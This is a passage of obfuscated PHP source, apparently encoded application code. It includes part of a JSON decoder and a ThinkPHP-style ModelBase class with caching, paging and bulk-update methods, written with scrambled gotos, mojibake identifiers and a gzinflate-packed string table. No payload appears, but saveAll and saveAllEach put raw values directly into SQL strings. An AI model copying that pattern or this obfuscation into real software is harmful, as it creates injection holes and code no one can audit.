$B™Ü·Ç˜“Ê, $F™Ëõ–Í[1966] => $eŠÂ÷ïÖô[$B™Ü·Ç˜“Ê])); } elseif ($eŠÂ÷ïÖô[$B™Ü·Ç˜“Ê] == $B±•ÑÔ­†î[$F™Ëõ–Í[1966]] && $B±•ÑÔ­†î[$F™Ëõ–Í[1965]] == SERVICES_JSON_IN_STR && (strlen(substr($eŠÂ÷ïÖô, 0, $B™Ü·Ç˜“Ê)) - strlen(rtrim(substr($eŠÂ÷ïÖô, 0, $B™Ü·Ç˜“Ê), $F™Ëõ–Í[93]))) % 2 != 1) { array_pop($f“­ÎííÇ); } elseif ($eŠÂ÷ïÖô[$B™Ü·Ç˜“Ê] == $F™Ëõ–Í[157] && in_array($B±•ÑÔ­†î[$F™Ëõ–Í[1965]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($f“­ÎííÇ, array($F™Ëõ–Í[1965] => SERVICES_JSON_IN_ARR, $F™Ëõ–Í[267] => $B™Ü·Ç˜“Ê, $F™Ëõ–Í[1966] => !1)); } elseif ($eŠÂ÷ïÖô[$B™Ü·Ç˜“Ê] == $F™Ëõ–Í[489] && $B±•ÑÔ­†î[$F™Ëõ–Í[1965]] == SERVICES_JSON_IN_ARR) { array_pop($f“­ÎííÇ); } elseif ($eŠÂ÷ïÖô[$B™Ü·Ç˜“Ê] == $F™Ëõ–Í[1075] && in_array($B±•ÑÔ­†î[$F™Ëõ–Í[1965]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($f“­ÎííÇ, array($F™Ëõ–Í[1965] => SERVICES_JSON_IN_OBJ, $F™Ëõ–Í[267] => $B™Ü·Ç˜“Ê, $F™Ëõ–Í[1966] => !1)); } elseif ($eŠÂ÷ïÖô[$B™Ü·Ç˜“Ê] == $F™Ëõ–Í[319] && $B±•ÑÔ­†î[$F™Ëõ–Í[1965]] == SERVICES_JSON_IN_OBJ) { array_pop($f“­ÎííÇ); } elseif ($dİ‡™Ø“œè == $F™Ëõ–Í[1969] && in_array($B±•ÑÔ­†î[$F™Ëõ–Í[1965]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($f“­ÎííÇ, array($F™Ëõ–Í[1965] => SERVICES_JSON_IN_CMT, $F™Ëõ–Í[267] => $B™Ü·Ç˜“Ê, $F™Ëõ–Í[1966] => !1)); $B™Ü·Ç˜“Ê++; } elseif ($dİ‡™Ø“œè == $F™Ëõ–Í[1970] && $B±•ÑÔ­†î[$F™Ëõ–Í[1965]] == SERVICES_JSON_IN_CMT) { array_pop($f“­ÎííÇ); $B™Ü·Ç˜“Ê++; for ($Bİ«ó‹±Ø» = $B±•ÑÔ­†î[$F™Ëõ–Í[267]]; $Bİ«ó‹±Ø» <= $B™Ü·Ç˜“Ê; ++$Bİ«ó‹±Ø») { $eŠÂ÷ïÖô = substr_replace($eŠÂ÷ïÖô, $F™Ëõ–Í[50], $Bİ«ó‹±Ø», 1); } } } if (reset($f“­ÎííÇ) == SERVICES_JSON_IN_ARR) { return $e“˜ë©…¯œ; } elseif (reset($f“­ÎííÇ) == SERVICES_JSON_IN_OBJ) { return $f”º—…«—…; } goto CöŸï£²¢; bŞçôÙ‚½¸: if ($CŒà®ùÒù[0] == $F™Ëõ–Í[157]) { $f“­ÎííÇ = array(SERVICES_JSON_IN_ARR); $e“˜ë©…¯œ = array(); } else { if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $f“­ÎííÇ = array(SERVICES_JSON_IN_OBJ); $f”º—…«—… = array(); } else { $f“­ÎííÇ = array(SERVICES_JSON_IN_OBJ); $f”º—…«—… = new stdClass(); } } array_push($f“­ÎííÇ, array($F™Ëõ–Í[1965] => SERVICES_JSON_SLICE, $F™Ëõ–Í[267] => 0, $F™Ëõ–Í[1966] => !1)); $eŠÂ÷ïÖô = substr($CŒà®ùÒù, 1, -1); goto AŸšî‡…Ò˜; CöŸï£²¢: } } } function isError($eÌ…ßÙ¦„‡, $cç¿ÄÊ†ˆÏ = null) { $eÀòÒ†²ÖÍ =& $_SERVER[‡’¶øåüç˜]; if (class_exists($eÀòÒ†²ÖÍ[1971])) { return PEAR::isError($eÌ…ßÙ¦„‡, $cç¿ÄÊ†ˆÏ); } elseif (is_object($eÌ…ßÙ¦„‡) && (get_class($eÌ…ßÙ¦„‡) == $eÀòÒ†²ÖÍ[1972] || is_subclass_of($eÌ…ßÙ¦„‡, $eÀòÒ†²ÖÍ[1972]))) { return !0; } return !1; } } goto b÷”èòö; D‹¹Ã³èŸ¾: register_shutdown_function($_SERVER[úÎ][32]); set_error_handler($_SERVER[úÎ][46], $E„Ïˆ°‰¹â); if (function_exists($_SERVER[úÎ][47])) { set_exception_handler($_SERVER[úÎ][48]); } goto DŒ‘ ÏáÀó; CëÊîØ‘¬Ä: $_SERVER[ÂØÃó©³¸¡¸¢] = explode($_SERVER[‡’¶øåüç˜][560], gzinflate(substr($_SERVER[‡’¶øåüç˜][561], 10, -8))); $côº¡Şê = $_SERVER[‡’¶øåüç˜][562]; if (!$côº¡Şê) { die; } goto a¤´í¸ÜŒƒ; d¥³ÏÉ’Ü®: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\144\151\x66\x79\x54\x69\155\x65", "\164\x69\x6d\145", "\151\156\163\145\162\x74\x2c\x75\160\x64\141\164\x65", "\x66\165\156\143\x74\151\157\156"), array("\143\x72\x65\x61\164\145\x54\x69\x6d\x65", "\x74\151\x6d\145", "\x69\x6e\x73\x65\162\164", "\x66\165\x6e\x63\x74\x69\157\156")); public function setDataAuto($CÆ½µ°šŒ) { $this->dataAuto = $CÆ½µ°šŒ; } public function __construct($eÉ¥˜Íøáò = '', $DéÄ³ùÆÅŒ = '', $e³ ¬æùÜÑ = '') { parent::__construct($eÉ¥˜Íøáò, $DéÄ³ùÆÅŒ, $e³ ¬æùÜÑ); } public static function textEncode($aÁº±š«´±) { if (!$aÁº±š«´±) { return $aÁº±š«´±; } $a ±í¶õç„ = json_encode($aÁº±š«´±); $a ±í¶õç„ = preg_replace_callback($_SERVER[‡’¶øåüç˜][346], function ($F‚ÇëÒğÄ) { return addslashes($F‚ÇëÒğÄ[0]); }, $a ±í¶õç„); return json_decode($a ±í¶õç„); } public static function textDecode($bÈ¦“¶ÑÄ¤) { $b§×Õò¼‰ä =& $_SERVER[‡’¶øåüç˜]; $c•İßßİ  = json_encode($bÈ¦“¶ÑÄ¤); $c•İßßİ  = preg_replace_callback($b§×Õò¼‰ä[347], function ($Eß×†¯ÜßÖ) { return $_SERVER[‡’¶øåüç˜][93]; }, $c•İßßİ ); return json_decode($c•İßßİ ); } protected $tableMeta = array(); protected function _beforeInsert(&$a¤¬ØßÌØë, $e¨¹Ú»»Ü ) { $c¸ŞÎ…Ş« =& $_SERVER[‡’¶øåüç˜]; if (!$this->checkDataAutoHas($c¸ŞÎ…Ş«[348])) { return; } $this->dataBeforeFilter($a¤¬ØßÌØë, $c¸ŞÎ…Ş«[348]); } protected function _beforeUpdate(&$FÆ¡¹åÒ‚, $aìÄƒÊˆØÔ) { $eÇŠâ¼÷˜ =& $_SERVER[‡’¶øåüç˜]; if (!$this->checkDataAutoHas($eÇŠâ¼÷˜[349])) { return; } $this->dataBeforeFilter($FÆ¡¹åÒ‚, $eÇŠâ¼÷˜[349]); } protected function _afterSelect(&$B¢’§ÛÌÜŒ, $Eá¶¡çñ´) { if (!is_array($B¢’§ÛÌÜŒ)) { return; } if (!$this->checkDataAutoHas($_SERVER[‡’¶øåüç˜][350])) { return; } foreach ($B¢’§ÛÌÜŒ as &$b÷¸ì«ã–š) { $this->dataAfterFilter($b÷¸ì«ã–š); } unset($b÷¸ì«ã–š); } protected function _afterFind(&$d»­ÆÌÀÓŠ, $AÛÊã°•ö) { if (!is_array($d»­ÆÌÀÓŠ)) { return; } if (!$this->checkDataAutoHas($_SERVER[‡’¶øåüç˜][350])) { return; } $this->dataAfterFilter($d»­ÆÌÀÓŠ); } public function setAutoIncrement($C¦ùäÉÊ¢) { $bÛŞÌ¨Š£ = array($this->getPk() => $C¦ùäÉÊ¢); $b¢ÃŠà¬ è = $this->data($bÛŞÌ¨Š£)->add(); if ($b¢ÃŠà¬ è) { $this->delete($b¢ÃŠà¬ è); } } public function getAutoIncrement() { $côßéÂ³˜ = $this->getTableName(); $cÜÓïó¦„§ = $this->max($this->getPk()); $A‚› óİ•“ = $this->query("\x73\150\x6f\167\x20\x74\141\142\x6c\145\40\x73\164\141\164\x75\x73\x20\167\150\145\162\x65\40\x4e\141\155\x65\x3d\47{$côßéÂ³˜}\47"); $BßôÎ—÷Íå = $A‚› óİ•“[0][$_SERVER[‡’¶øåüç˜][351]]; $dŞë¦µËñÇ = max($cÜÓïó¦„§, $BßôÎ—÷Íå); return $dŞë¦µËñÇ; } protected function _callBefore($C¼ÖŒ¦“İ, $câ½»©È) { return $this->cacheCallCheck($C¼ÖŒ¦“İ, $câ½»©È, !1); } protected function _callAfter($eÍ¦ï©Óõ , $d£­”Ï¬Ü) { return $this->cacheCallCheck($eÍ¦ï©Óõ , $d£­”Ï¬Ü, !0); } protected function cacheFunctionAlias($CÃëÎ¦…÷Œ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($A²…İõ¥Ä×, $EË“ôŞÍñ, $AäÛ®÷ŞÑ = false) { $F±Éá¡Ï¹ø = $this->cacheFunctionAlias($EË“ôŞÍñ); if (!$F±Éá¡Ï¹ø) { return; } foreach ($F±Éá¡Ï¹ø as $c‹´¿”ºÛ“ => $eÈ¸Şáø‚Ì) { $E©äÉ“Ú¾¹ = $eÈ¸Şáø‚Ì[0]; $Cùªœ«µ „ = explode($_SERVER[‡’¶øåüç˜][47], $eÈ¸Şáø‚Ì[1]); if ($A²…İõ¥Ä× == $c‹´¿”ºÛ“) { return $this->cacheFunctionGet($c‹´¿”ºÛ“, $E©äÉ“Ú¾¹); } if ($AäÛ®÷ŞÑ && in_array($A²…İõ¥Ä×, $Cùªœ«µ „)) { $this->cacheFunctionClear($c‹´¿”ºÛ“, $E©äÉ“Ú¾¹); } } } public function cacheFunctionGet($A£•ªç¶º¯, $dŒ½Óò¸˜Ğ) { $a¯è¥…‡Ú = $this->cacheKeyMake($A£•ªç¶º¯, $dŒ½Óò¸˜Ğ); $aÃØæÕÍÇ = Cache::get($a¯è¥…‡Ú); if (!is_array($aÃØæÕÍÇ)) { $aÃØæÕÍÇ = call_user_func_array(array($this, $A£•ªç¶º¯), array($dŒ½Óò¸˜Ğ, !0)); Cache::set($a¯è¥…‡Ú, $aÃØæÕÍÇ); } return $aÃØæÕÍÇ; } public function cacheFunctionClear($A«İÆ·Ì, $c£É´‰é¶) { $dê”Ë°ŒÁ = $c£É´‰é¶; if (!is_array($c£É´‰é¶)) { $dê”Ë°ŒÁ = array($c£É´‰é¶); } foreach ($dê”Ë°ŒÁ as $d› Ç÷Ùµ¨) { $CœÙïŸƒ™› = $this->cacheKeyMake($A«İÆ·Ì, $d› Ç÷Ùµ¨); Cache::remove($CœÙïŸƒ™›); } } private function cacheKeyMake($aô¬é¨÷â×, $C²Ïõ¤ğ) { $D—’ãº÷İ‹ =& $_SERVER[‡’¶øåüç˜]; return get_class($this) . $D—’ãº÷İ‹[70] . $aô¬é¨÷â× . $D—’ãº÷İ‹[352] . $C²Ïõ¤ğ; } protected function selectPage($cˆçÊ¦ ¥ = 200, $EÀê´ƒŞæÍ = 1) { goto E›…¦¡ĞíÛ; E›…¦¡ĞíÛ: $Fç‡ÉÌ™ğÒ =& $_SERVER[‡’¶øåüç˜]; global $in; $cÄÉç”óˆö = $this->optionsValue(); goto Eù¡ÈÀ¿„; Eù¡ÈÀ¿„: $dØ¤¤½Ñ²‡ = 4000; $cˆçÊ¦ ¥ = isset($in[$Fç‡ÉÌ™ğÒ[353]]) ? $in[$Fç‡ÉÌ™ğÒ[353]] : $cˆçÊ¦ ¥; if ($cˆçÊ¦ ¥ === -1) { unset($in[$Fç‡ÉÌ™ğÒ[353]]); $dØ¤¤½Ñ²‡ = 100000000; $cˆçÊ¦ ¥ = $dØ¤¤½Ñ²‡; } goto cÂğİ›À•; DÒè•íÌ¦¹: if ($cÏÛé™”™ğ == 1) { $c•š“Ëôìó = count($C²¨ùŞ¤•†); } $fóƒ·åöõß = array($Fç‡ÉÌ™ğÒ[355] => array($Fç‡ÉÌ™ğÒ[356] => $c•š“Ëôìó, $Fç‡ÉÌ™ğÒ[353] => $cˆçÊ¦ ¥, $Fç‡ÉÌ™ğÒ[344] => $EÀê´ƒŞæÍ, $Fç‡ÉÌ™ğÒ[357] => $cÏÛé™”™ğ), $Fç‡ÉÌ™ğÒ[358] => $C²¨ùŞ¤•† ? $C²¨ùŞ¤•† : array()); return $fóƒ·åöõß; goto d®Õ‘¯Ú†; còÒ®²ÂŒÈ: $c•š“Ëôìó = intval($this->count()); $cˆçÊ¦ ¥ = intval($cˆçÊ¦ ¥); $cˆçÊ¦ ¥ = $cˆçÊ¦ ¥ <= 5 ? 5 : ($cˆçÊ¦ ¥ >= $dØ¤¤½Ñ²‡ ? $dØ¤¤½Ñ²‡ : $cˆçÊ¦ ¥); goto aø¼òÒè‹À; C¾¢×­êÓ: $this->optionsValue($cÄÉç”óˆö); $C²¨ùŞ¤•† = $this->page($EÀê´ƒŞæÍ, $cˆçÊ¦ ¥)->select(); $C²¨ùŞ¤•† = is_array($C²¨ùŞ¤•†) ? $C²¨ùŞ¤•† : array(); goto DÒè•íÌ¦¹; cÂğİ›À•: $Cµ¨®¦Û‚” = $cÄÉç”óˆö; $Cµ¨®¦Û‚”[$Fç‡ÉÌ™ğÒ[354]] = array(); $this->optionsValue($Cµ¨®¦Û‚”); goto còÒ®²ÂŒÈ; aø¼òÒè‹À: $cÏÛé™”™ğ = ceil($c•š“Ëôìó / $cˆçÊ¦ ¥); $EÀê´ƒŞæÍ = intval(isset($in[$Fç‡ÉÌ™ğÒ[344]]) ? $in[$Fç‡ÉÌ™ğÒ[344]] : $EÀê´ƒŞæÍ); $EÀê´ƒŞæÍ = $EÀê´ƒŞæÍ <= 1 ? 1 : ($EÀê´ƒŞæÍ >= $cÏÛé™”™ğ ? $cÏÛé™”™ğ : $EÀê´ƒŞæÍ); goto C¾¢×­êÓ; d®Õ‘¯Ú†: } protected function checkLength($eÖÓ¯ÀìÔÒ, $B‹¤ÛØÉÁØ = 0, $fæÉù©××³ = '') { $Fí“¤„¿­è =& $_SERVER[‡’¶øåüç˜]; $B‹¤ÛØÉÁØ = $B‹¤ÛØÉÁØ ? $B‹¤ÛØÉÁØ : 65536; if (!$eÖÓ¯ÀìÔÒ || strlen($eÖÓ¯ÀìÔÒ) < $B‹¤ÛØÉÁØ) { return; } $fæÉù©××³ = $fæÉù©××³ ? $fæÉù©××³ . $Fí“¤„¿­è[67] : $Fí“¤„¿­è[33]; show_json($fæÉù©××³ . LNG($Fí“¤„¿­è[359]) . "\x28{$B‹¤ÛØÉÁØ}\x29", !1); } protected function metaSet($BĞÖÖ¿åƒ, $FÙìïŠÀÔ = null, $Bæ£„›å‹ = null) { goto E£ªßÉŠà£; D¦¥ù‰İš: if (is_null($FÙìïŠÀÔ)) { return $A·¸ô…Ò->where(array($Cã¹ßÚùÅÜ => $BĞÖÖ¿åƒ))->delete(); } if (is_null($Bæ£„›å‹) && is_string($FÙìïŠÀÔ)) { return $A·¸ô…Ò->where($fÚ—Ø…­âÅ)->delete(); } $B¤ã«Éš¯™ = is_array($FÙìïŠÀÔ) ? $FÙìïŠÀÔ : array(); goto Dğ¿ÒÚƒõ ; dØœÎÕù­æ: $A·¸ô…Ò->where(array($Cã¹ßÚùÅÜ => $BĞÖÖ¿åƒ))->addAll($fƒÑ×Şõë¨, array(), !0); return !0; goto EäŒë•³š½; D“«ë¨¦¹é: $F…©ß¾´Ö” = $this->tableMeta[$C¨³¸ßÍŒÏ[361]]; $A·¸ô…Ò = Model($F…©ß¾´Ö”); $fÚ—Ø…­âÅ = array($Cã¹ßÚùÅÜ => $BĞÖÖ¿åƒ, $C¨³¸ßÍŒÏ[362] => $FÙìïŠÀÔ); goto D¦¥ù‰İš; Dğ¿ÒÚƒõ : if (is_string($FÙìïŠÀÔ)) { $B¤ã«Éš¯™[$FÙìïŠÀÔ] = $Bæ£„›å‹; } $fƒÑ×Şõë¨ = array(); foreach ($B¤ã«Éš¯™ as $f´—Çöõ³ñ => $bÀîôÛÀì) { $this->checkLength($bÀîôÛÀì, !1, $F…©ß¾´Ö” . $C¨³¸ßÍŒÏ[4] . $f´—Çöõ³ñ); $fƒÑ×Şõë¨[] = array($Cã¹ßÚùÅÜ => $BĞÖÖ¿åƒ, $C¨³¸ßÍŒÏ[89] => $f´—Çöõ³ñ, $C¨³¸ßÍŒÏ[363] => $bÀîôÛÀì); } goto dØœÎÕù­æ; E£ªßÉŠà£: $C¨³¸ßÍŒÏ =& $_SERVER[‡’¶øåüç˜]; if (!$this->tableMeta) { return !1; } $Cã¹ßÚùÅÜ = $this->tableMeta[$C¨³¸ßÍŒÏ[360]]; goto D“«ë¨¦¹é; EäŒë•³š½: } public function metaGet($a‚Á”ìåè, $EğÔÁÑøö = false) { goto C³©»ŠÛ¨; C³©»ŠÛ¨: $a°İÔÂÕÜ =& $_SERVER[‡’¶øåüç˜]; if (!$this->tableMeta) { return array(); } $c±º•¹²²• = $this->tableMeta[$a°İÔÂÕÜ[360]]; goto F¾ã®ò‚’„; F¾ã®ò‚’„: $aÅóÎø©“í = Model($this->tableMeta[$a°İÔÂÕÜ[361]]); if ($EğÔÁÑøö) { $e’—äƒ¨ã˜ = array($c±º•¹²²• => $a‚Á”ìåè, $a°İÔÂÕÜ[89] => $EğÔÁÑøö); return $aÅóÎø©“í->where($e’—äƒ¨ã˜)->getField($a°İÔÂÕÜ[363]); } $e’—äƒ¨ã˜ = array($c±º•¹²²• => $a‚Á”ìåè); goto Eßóˆ‰¿£ğ; Eßóˆ‰¿£ğ: $D½Ìç˜•‹Ú = $aÅóÎø©“í->field($a°İÔÂÕÜ[364])->where($e’—äƒ¨ã˜)->select(); $D½Ìç˜•‹Ú = array_to_keyvalue($D½Ìç˜•‹Ú, $a°İÔÂÕÜ[89], $a°İÔÂÕÜ[363]); return $D½Ìç˜•‹Ú; goto A–‰¢İ÷; A–‰¢İ÷: } private function checkDataAutoHas($BÑÑÛ‚ã³‰) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $cáÑÕßÍ¾“) { if (in_array($BÑÑÛ‚ã³‰, explode($_SERVER[‡’¶øåüç˜][47], $cáÑÕßÍ¾“[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$b‚âÔâ–¥, $A¨ß—âôîµ) { $Eª¶ø¨‹Šé =& $_SERVER[‡’¶øåüç˜]; foreach ($this->dataAuto as $D ×‰ªÑ¯) { $AèÕ·øğ¬œ = $D ×‰ªÑ¯[0]; if (!in_array($A¨ß—âôîµ, explode($Eª¶ø¨‹Šé[47], $D ×‰ªÑ¯[2]))) { continue; } switch (trim($D ×‰ªÑ¯[3])) { case $Eª¶ø¨‹Šé[313]: case $Eª¶ø¨‹Šé[314]: $eÆÚÒÔ¦ò™ = $D ×‰ªÑ¯[1]; $dË‚…Îç« = isset($D ×‰ªÑ¯[4]) ? (array) $D ×‰ªÑ¯[4] : array(); if ($eÆÚÒÔ¦ò™ == $Eª¶ø¨‹Šé[194] && array_key_exists($AèÕ·øğ¬œ, $b‚âÔâ–¥)) { if (!$b‚âÔâ–¥[$AèÕ·øğ¬œ]) { unset($b‚âÔâ–¥[$AèÕ·øğ¬œ]); } break; } if (isset($b‚âÔâ–¥[$AèÕ·øğ¬œ])) { array_unshift($dË‚…Îç«, $b‚âÔâ–¥[$AèÕ·øğ¬œ]); } if ($Eª¶ø¨‹Šé[313] == $D ×‰ªÑ¯[3]) { $b‚âÔâ–¥[$AèÕ·øğ¬œ] = call_user_func_array($eÆÚÒÔ¦ò™, $dË‚…Îç«); } else { $b‚âÔâ–¥[$AèÕ·øğ¬œ] = call_user_func_array(array(&$this, $eÆÚÒÔ¦ò™), $dË‚…Îç«); } break; case $Eª¶ø¨‹Šé[265]: $b‚âÔâ–¥[$AèÕ·øğ¬œ] = $b‚âÔâ–¥[$D ×‰ªÑ¯[1]]; break; case $Eª¶ø¨‹Šé[286]: if (isset($b‚âÔâ–¥[$AèÕ·øğ¬œ]) && !is_string($b‚âÔâ–¥[$AèÕ·øğ¬œ])) { $b‚âÔâ–¥[$AèÕ·øğ¬œ] = json_encode_force($b‚âÔâ–¥[$AèÕ·øğ¬œ]); } break; case $Eª¶ø¨‹Šé[315]: if ($b‚âÔâ–¥[$AèÕ·øğ¬œ] === $Eª¶ø¨‹Šé[33]) { unset($b‚âÔâ–¥[$AèÕ·øğ¬œ]); } break; case $Eª¶ø¨‹Šé[316]: $b‚âÔâ–¥[$AèÕ·øğ¬œ] = $D ×‰ªÑ¯[1]; default: break; } } if ($A¨ß—âôîµ == $Eª¶ø¨‹Šé[348]) { $AšÃ‰ô­Û = strtolower($this->db->getDbType()); if (strpos($AšÃ‰ô­Û, $Eª¶ø¨‹Šé[9]) !== 0) { return; } $CŒ¤ùÎŞŒ… = $this->field(!0)->fields; $Dø»­Û…§ø = $CŒ¤ùÎŞŒ…[$Eª¶ø¨‹Šé[244]]; if (isset($CŒ¤ùÎŞŒ…[$Eª¶ø¨‹Šé[243]])) { unset($Dø»­Û…§ø[$CŒ¤ùÎŞŒ…[$Eª¶ø¨‹Šé[243]]]); } foreach ($Dø»­Û…§ø as $e£ÉÕØ¨Œ => $A¨ß—âôîµ) { if (!isset($b‚âÔâ–¥[$e£ÉÕØ¨Œ])) { $b‚âÔâ–¥[$e£ÉÕØ¨Œ] = $Eª¶ø¨‹Šé[33]; } } } } private function dataAfterFilter(&$dÑ¼ô©‰ÅÂ) { $a™Õ¢ã¼ =& $_SERVER[‡’¶øåüç˜]; foreach ($this->dataAuto as $dãÕÁ¨’ù) { $bŞ¦¯Ìœè = $dãÕÁ¨’ù[0]; if (!in_array($a™Õ¢ã¼[350], explode($a™Õ¢ã¼[47], $dãÕÁ¨’ù[2]))) { continue; } if (!isset($dÑ¼ô©‰ÅÂ[$bŞ¦¯Ìœè])) { continue; } switch (trim($dãÕÁ¨’ù[3])) { case $a™Õ¢ã¼[313]: case $a™Õ¢ã¼[314]: $b‡ñˆ„š— = isset($dãÕÁ¨’ù[4]) ? (array) $dãÕÁ¨’ù[4] : array(); array_unshift($b‡ñˆ„š—, $dÑ¼ô©‰ÅÂ[$bŞ¦¯Ìœè]); if ($a™Õ¢ã¼[313] == $dãÕÁ¨’ù[3]) { $dÑ¼ô©‰ÅÂ[$bŞ¦¯Ìœè] = call_user_func_array($dãÕÁ¨’ù[1], $b‡ñˆ„š—); } else { $dÑ¼ô©‰ÅÂ[$bŞ¦¯Ìœè] = call_user_func_array(array(&$this, $dãÕÁ¨’ù[1]), $b‡ñˆ„š—); } break; case $a™Õ¢ã¼[265]: $dÑ¼ô©‰ÅÂ[$bŞ¦¯Ìœè] = $dÑ¼ô©‰ÅÂ[$dãÕÁ¨’ù[1]]; break; case $a™Õ¢ã¼[286]: $Dšïª˜’ßÉ = $dÑ¼ô©‰ÅÂ[$bŞ¦¯Ìœè]; $dÑ¼ô©‰ÅÂ[$bŞ¦¯Ìœè] = json_decode($Dšïª˜’ßÉ, !0); if (is_null($dÑ¼ô©‰ÅÂ[$bŞ¦¯Ìœè])) { $dÑ¼ô©‰ÅÂ[$bŞ¦¯Ìœè] = $Dšïª˜’ßÉ; } break; case $a™Õ¢ã¼[315]: if ($dÑ¼ô©‰ÅÂ[$bŞ¦¯Ìœè] === $a™Õ¢ã¼[33]) { unset($dÑ¼ô©‰ÅÂ[$bŞ¦¯Ìœè]); } break; case $a™Õ¢ã¼[316]: $dÑ¼ô©‰ÅÂ[$bŞ¦¯Ìœè] = $dãÕÁ¨’ù[1]; default: break; } } } public function saveAll($cš²è…•¨ï) { goto A‰‡¡ŞôÛ†; CªÀÅ§º™: $a™ÃñçèÖ = array(); $f›Şö”¿¸ = count($cš²è…•¨ï); for ($eø§ÇïŒ¹É = 0; $eø§ÇïŒ¹É < $f›Şö”¿¸; $eø§ÇïŒ¹É++) { $FÊ½ï¯ƒ¥« = $cš²è…•¨ï[$eø§ÇïŒ¹É]; if (!is_array($FÊ½ï¯ƒ¥«) || count($FÊ½ï¯ƒ¥«) != 4) { continue; } $F˜“¤°õÎø = "\125\x50\104\101\x54\105\40\140{$b˜İ±œ¯®}\x60\x20\x53\x45\124\x20{$FÊ½ï¯ƒ¥«[2]}\x20\75\40\103\101\123\x45\x20{$FÊ½ï¯ƒ¥«[0]}\40\12"; if ($aœ‡í“£ãä == 0) { $E’Š¹›æºÎ = $F˜“¤°õÎø; } $a™ÃñçèÖ[] = $d“ƒ½¬È·[113] . $FÊ½ï¯ƒ¥«[1] . $d“ƒ½¬È·[113]; $aœ‡í“£ãä++; $E’Š¹›æºÎ .= "\x20\x57\x48\105\x4e\x20\x27{$FÊ½ï¯ƒ¥«[1]}\x27\40\124\x48\105\x4e\40\x27{$FÊ½ï¯ƒ¥«[3]}\x27\x20\xa"; if ($aœ‡í“£ãä == $eâ­ŒÄç÷ || $eø§ÇïŒ¹É == $f›Şö”¿¸ - 1) { goto a¶ç¼ñ“åŞ; DìÑ‘“ê‡: $a™ÃñçèÖ = array(); goto cºœÉ£ÚÃ¨; a¶ç¼ñ“åŞ: $E·»Îí©¦ = implode($d“ƒ½¬È·[47], $a™ÃñçèÖ); $E’Š¹›æºÎ .= "\x20\x45\116\104\x20\x20\127\110\x45\x52\105\x20{$FÊ½ï¯ƒ¥«[0]}\x20\111\116\40\x28{$E·»Îí©¦}\x29\40"; $this->execute($E’Š¹›æºÎ); goto Aù² §ƒ†±; Aù² §ƒ†±: $aœ‡í“£ãä = 0; $E’Š¹›æºÎ = $F˜“¤°õÎø; $this->chunkEventCheck(count($a™ÃñçèÖ)); goto DìÑ‘“ê‡; cºœÉ£ÚÃ¨: } } goto eèÀÎ¬®Ñã; eèÀÎ¬®Ñã: $this->chunkEventSet(); goto dßÏÔ‘‚İ¨; bŠÄƒ­šø: $cš²è…•¨ï = is_array($cš²è…•¨ï) ? $cš²è…•¨ï : array(); $E’Š¹›æºÎ = $d“ƒ½¬È·[365]; $aœ‡í“£ãä = 0; goto CªÀÅ§º™; A‰‡¡ŞôÛ†: $d“ƒ½¬È· =& $_SERVER[‡’¶øåüç˜]; $b˜İ±œ¯® = $this->tablePrefix . $this->tableName; $eâ­ŒÄç÷ = self::SQL_WHERE_IN_CHUNK; goto bŠÄƒ­šø; dßÏÔ‘‚İ¨: } public function saveAllEach($a‰Ñ°Èïí‡) { $e¦º‰††Ú =& $_SERVER[‡’¶øåüç˜]; $A´£‘ô•…› = $this->tablePrefix . $this->tableName; foreach ($a‰Ñ°Èïí‡ as $cœ»ŒĞè¢) { if (!is_array($cœ»ŒĞè¢) || count($cœ»ŒĞè¢) != 4) { continue; } $dïÉƒô«“Ğ = $cœ»ŒĞè¢[0] . $e¦º‰††Ú[366] . $cœ»ŒĞè¢[1] . $e¦º‰††Ú[113]; $Fº–½ = $cœ»ŒĞè¢[2] . $e¦º‰††Ú[366] . $cœ»ŒĞè¢[3] . $e¦º‰††Ú[113]; $C¬ƒß•ƒ«ö = "\165\x70\144\x61\x74\145\x20{$A´£‘ô•…›}\40\163\145\164\x20{$Fº–½}\40\167\x68\145\162\x65\40{$dïÉƒô«“Ğ}\x3b"; $this->execute($C¬ƒß•ƒ«ö); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($DÊÔ›‘Ä·Ç = false, $bùÔ»…„Ş = false) { $this->_chunkEvent = $DÊÔ›‘Ä·Ç; $this->_chunkEventParam = $bùÔ»…„Ş; } private function chunkEventCheck($bÑ×ÃŠÓ«) { if (!$this->_chunkEvent) { return; } $b¬¬Ç±Ò‚– = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $b¬¬Ç±Ò‚–[$_SERVER[‡’¶øåüç˜][367]] = $bÑ×ÃŠÓ«; Hook::trigger($this->_chunkEvent, $b¬¬Ç±Ò‚–); } public function addAll($EŸîÆá¬˜Ş, $DÁñ÷Øˆ×á = array(), $dŸÌî®÷®œ = false) { goto DÜòì‘Š§; E¡”äœ¯®·: if (empty($EŸîÆá¬˜Ş)) { $this->error = think_lang($A±¥îÚë³[263]); return !1; } $DÁñ÷Øˆ×á = $this->_parseOptions($DÁñ÷Øˆ×á); foreach ($EŸîÆá¬˜Ş as $b÷ŒíÉ¾Æ¹ => $b‰àßÍƒ”) { $EŸîÆá¬˜Ş[$b÷ŒíÉ¾Æ¹] = $this->_facade($b‰àßÍƒ”); $this->_beforeInsert($EŸîÆá¬˜Ş[$b÷ŒíÉ¾Æ¹], $DÁñ÷Øˆ×á); } goto e‹·ôéãİ; DÜòì‘Š§: $A±¥îÚë³ =& $_SERVER[‡’¶øåüç˜]; ignore_timeout(); $eó¥‘¡¬ÖÎ = self::SQL_WHERE_IN_CHUNK; goto E¡”äœ¯®·; e‹·ôéãİ: if (method_exists($this->db, $A±¥îÚë³[264])) { for ($CÛèøİÎšÖ = 0; $CÛèøİÎšÖ < count($EŸîÆá¬˜Ş); $CÛèøİÎšÖ += $eó¥‘¡¬ÖÎ) { $f°» Ââ˜± = array_slice($EŸîÆá¬˜Ş, $CÛèøİÎšÖ, $eó¥‘¡¬ÖÎ); if (!is_array($f°» Ââ˜±) || count($f°» 